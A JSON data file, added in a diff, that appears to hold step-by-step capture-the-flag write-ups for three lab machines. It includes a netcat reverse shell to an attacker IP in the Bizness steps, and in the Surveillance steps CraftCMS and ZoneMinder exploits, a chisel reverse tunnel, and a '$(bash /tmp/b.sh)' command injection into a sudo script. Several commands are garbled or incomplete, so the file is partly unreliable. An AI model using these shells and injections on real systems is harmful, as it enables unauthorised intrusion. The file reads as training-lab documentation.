@@ -1,0 +1,196 @@
+{
+    "Visual": 
+        {
+        "recon" : [
+            {
+                "title" : "Visual Reconnaissance",
+                "description" : "This machine is a visual machine, so we will be using nmap to scan the machine and see what ports are open and what services are running. We will also be using the -vv flag to increase verbosity and the -oN flag to save the output to a file. We will also be using the -sC and -sV flags to run default scripts and enumerate the version of the services running on the machine.",
+                "commands" : "nmap 10.10.11.234 -vv -sC -sV -oN visual.txt",
+                "image": "/visual_recon.webp"
+            },
+            {
+                "title" : "Exploring futher",
+                "description" : "This website seems to be a tool for building .NET projects from a Git repository. So I try to open http server on my local machine and send url to Git Repo URL on website",
+                "commands" : "python3 -m http.server 80",
+                "image": "/visual_recon2.webp"  
+            },
+            {
+                "title" : "Cloning the repository",
+                "description" : "I send the url to Git Repo URL on website and it seems to be working, so I try to clone the repository and see what's inside",
+                "commands" : "$ dotnet new sln -n virtual \n $ dotnet new console -n virtual \n$ dotnet sln add virtual/virtual.csproj \n$ git init",
+                "image": "/visual_recon3.webp"
+            }
+        ],
+        "user" : [
+            {
+                "title" : "Visual User",
+                "description" : "",
+                "commands" : "",
+                "image": ""
+            }
+        ], 
+        "root" : [
+            {
+                "title" : "Visual Root",
+                "description" : "",
+                "commands" : "",
+                "image": ""
+            }
+        ],
+        "summary" : [
+            {
+                "title" : "Visual Summary",
+                "description" : "",
+                "commands" : "",
+                "image": ""
+            }
+        ]
+        },
+    "Bizness": 
+        {
+            "recon": [
+                {
+                    "title": "Bizness Reconnaissance",
+                    "description": "This machine is a Bizness machine, so we will be using nmap to scan the machine and see what ports are open and what services are running. We will also be using the -vv flag to increase verbosity and the -oN flag to save the output to a file. We will also be using the -sC and -sV flags to run default scripts and enumerate the version of the services running on the machine.",
+                    "commands": "nmap -Sv -vv -oN bizness.txt",
+                    "image": "/bizness_recon.webp"
+                },
+                {
+                    "title": "Bizness Reconnaissance",
+                    "description": "Staring looking through the website, i found some type of login page using gobusters. I tried to login with some default credentials, but no luck.",
+                    "commands": "gobusters dir -u http://bizness.htb -w /usr/share/seclists/Discovery/Web-Content/common-txt -x php -r",
+                    "image": "/bizness_recon2.png"
+                }
+            ],
+                "user": [
+                {
+                    "title": "Bizness User",
+                    "description": "While exploing futher, i found out that the site is using Apache OFBiz. i started to look for exploits for that version of Apache OFBiz. I found a exploit and ran it. https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass",
+                    "commands": "python3 exploit.py --url http://bizness.htb --cmd nc 10.10.14.162 1337 -e /bin/bash",
+                    "image": "/bizness_user.png"
+                },
+                {
+                    "title": "Bizness User",
+                    "description": "I got a shell as ofbiz user. I copied the id_rsa file to my machine and used it to get a stable ssh connection to the machine.",
+                    "commands": "ssh ofbiz@bizness.htb -i id_rsa",
+                    "image": "/bizness_root.png"
+                }
+            ],
+            "root" : [
+                {
+                    "title": "Bizness Root",
+                    "description": "I started to look for usefull information on the machine. I uploaded Linepeas to the machine and ran it. I found not really much of usefull information. I think most of them were rabbit holes. Then i started to look for log files, and i found som interesting runtime logs.",
+                    "commands": "find / -type d -name *logs* 2>/dev/null",
+                    "image": "/bizness_root2.png"
+                },
+                {
+                    "title": "Bizness Root",
+                    "description": "Finally i found a log file that contained a SHA hash. But i wasn´t able to crack it. So i started to look for more logs and xml files .",
+                    "commands": "strings *.dat | grep SHA",
+                    "image": "/bizness_root3.png"
+                },
+                {
+                    "title": "Bizness Root",
+                    "description": "I found a xml file that contained what lookt like a salt. Futher i discoverd a python script for cracking the hash with the salt",
+                    "commands": "find / -type d -iname *admin*.xml 2>/dev/null",
+                    "image": "/bizness_root4.png"
+                },
+                {
+                    "title": "Bizness Root",
+                    "description": "I used the python script to crack the hash and got the password. I used the password to login to the machine as root.",
+                    "commands": "python3 exploit.py --HASH--",
+                    "image": "/bizness_root5.png"
+                }
+            ],
+            "summary": [
+                {
+                    "title": "Bizness Summary",
+                    "description": "This machine was a fun machine to hack. I learned a lot of new things. I found out that the machine was using Apache OFBiz, and i found a exploit for that version. I got a shell as ofbiz user and then i found a hash in a log file. I cracked the hash and got the password for the root user. The flag is located in the /root directory.",
+                    "commands": "cat /root/root.txt",
+                    "image": "/bizness_root6.png"
+                }
+            ]
+        },
+        "Surveillance": {
+            "recon": [
+                {
+                    "title": "Surveillance Reconnaissance",
+                    "description": "The scan shows that quite many ports where open. The first one to check out was port 80",
+                    "commands": "nmap -Sv -vv -oN scan.txt 10.10.11.245 \n nano /etc/host | sudo tee -a 10.10.11.245 surveillance.htb",
+                    "image": "/surveillance_recon.png"
+                },
+                {
+                    "title": "Surveillance Reconnaissance",
+                    "description": "Later on, i found out that webbsite has some interesting directories. I decided to check them out. Specially /admin witch seems to be a login page. The site is using craft-cms, so i started to look for exploits for that version of craft-cms. I also used gobusters to find more directories. But no hits.",
+                    "commands": "gobusters dir -u http://surveillance.htb -w /usr/share/seclists/Discovery/Web-Content/common-txt -x php -r",
+                    "image": "/surveillance_recon2.png"
+                },
+                {
+                    "title": "Surveillance Reconnaissance",
+                    "description": "I found a exploit for the version of craft-cms that the site is using. I downloaded the exploit and ran it. I got a shell as www-data, i used this explot to get a reverse shell. https://github.com/Faelian/CraftCMS_CVE-2023-41892",
+                    "commands": "python3 craft-cms.py http://surveillance.htb",
+                    "image": "/surveillance_recon2.2.png"
+                },
+                {
+                    "title": "Surveillance Reconnaissance",
+                    "description": "I started exploing the machine for usefull information. After a while a found som environment variables that contained a password.",
+                    "commands": "find / -type f -name *.env 2>/dev/null",
+                    "image": "/surveillance_recon3.png"
+                }
+            ],
+            "user": [
+                {
+                    "title": "Surveillance User",
+                    "description": "I used the password i found in the environment variables, but it could not be cracked. I then found out that the password was encrypted with a key. so i strated to look for the for more information. And in /var/www/html/craft directory and found a .sql.zip file in storage/backups.",
+                    "commands": "unzip surveillance — 2023–10–17–202801 — v4.4.14.sql.zip",
+                    "image": "/surveillance_recon5.png"
+                },
+                {
+                    "title": "Surveillance User",
+                    "description": "I tried to crack the password again, this time hascat gave a match. I used the password to login to the machine.",
+                    "commands": "hashcat -m 1400 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt --force",
+                    "image": "/surveillance_recon6.png"
+                }   
+            ],
+            "root": [
+                {
+                    "title": "Surveillance Root",
+                    "description": "I started to look for usefull information on the machine. I found a .env file containing a password to database. But i think it was the same database stored in backupfiles ",
+                    "commands": "cat /var/www/html/craft/.env",
+                    "image": "/surveillance_root.png"
+                },
+                {
+                    "title": "Surveillance Root",
+                    "description": "futher exploing the machine, i found a database.php file that contained the password for the database. I used the password to login to the database and found the flag.",
+                    "commands": "cat database.php",
+                    "image": "/surveillance_root2.png"
+                },
+                {
+                    "title": "Surveillance Root",
+                    "description": "I notice the service, Zoneminder witch is a program for monitoring. is running locally on the machine so i needed to portforward the port to my machine. I used chisel for reverse proxoy the service to my machine.",
+                    "commands": "victim: chisel client 10.10.14.162:8000 R:8080:10.10.11.245:8080; attacker: chisel server -p 8000 --reverse ",
+                    "image": "/surveillance_root3.png"
+                },
+                {
+                    "title": "Surveillance Root",
+                    "description": "I started to look for CVE:s for the version of Zoneminder that the machine is running. I found a exploit for that version. I downloaded the exploit and ran it. https://github.com/rvizx/CVE-2023-26035",
+                    "commands": "python3 exploit.py t- 127.0.0.1:8000 -ip 10.10.14.162 -p 1337",
+                    "image": "/surveillance_root4.png"
+                },
+                {
+                    "title": "Surveillance Root",
+                    "description": "I got a shell as zoneminder. After a few minutes of searching in the internet, I found one way to get to root. https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/",
+                    "commands": "sudo /usr/bin/zmupdate.pl --version=1.36.32 --user='$(bash /tmp/b.sh)' --pass='ZoneMinderPassword2023'",
+                    "image": "/surveillance_root5.png"
+                }
+            ],
+            "summary": [
+                {
+                    "title": "Surveillance Summary",
+                    "description": "This machine was a fun machine to hack. I learned a lot of new things. I found out that the machine was using craft-cms, and i found a exploit for that version. I got a shell as www-data user and then i found a password in a environment variable. I cracked the password and got the password for the user. The flag is located in the /home/user directory.",
+                    "commands": "cat /home/user/user.txt",
+                    "image": "/surveillance_recon8.png"
+                }
+            ]
+        }
+}
